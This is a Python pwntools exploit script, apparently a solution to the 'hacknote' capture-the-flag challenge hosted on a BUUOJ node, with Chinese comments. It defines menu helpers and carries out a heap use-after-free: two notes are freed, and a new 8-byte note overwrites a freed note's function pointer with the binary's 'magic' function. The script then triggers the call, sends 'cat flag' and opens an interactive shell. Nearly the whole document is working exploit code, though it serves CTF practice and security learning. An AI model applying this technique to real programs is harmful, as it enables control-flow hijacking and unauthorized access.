from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'hacknote'
port = 25049

###########修改宏###########
DEBUG = 0
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libs))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
堆溢出
'''

def add_note(size:int, content:bytes=b'\x00'):
    global io
    io.sendafter("Your choice :", b'1')
    io.sendafter("Note size :", str(size).encode())
    io.sendafter("Content :", content)
    io.recvuntil("Success !\n")

def del_note(idx:int):
    global io
    io.sendafter("Your choice :", b'2')
    io.sendafter("Index :", str(idx).encode())
    io.recvuntil("Success\n")

def print_note(idx:int):
    global io
    io.sendafter("Your choice :", b'3')
    io.sendafter("Index :", str(idx).encode())
    return io.recv()
    
'''
uaf 注意bins的范围
'''
add_note(0x10)
add_note(0x10)
del_note(0)
del_note(1)
add_note(0x8, p32(io_elf.sym['magic']))

io.sendafter("Your choice :", b'3')
io.sendafter("Index :", str(0).encode())
io.sendline('cat flag')
io.interactive()
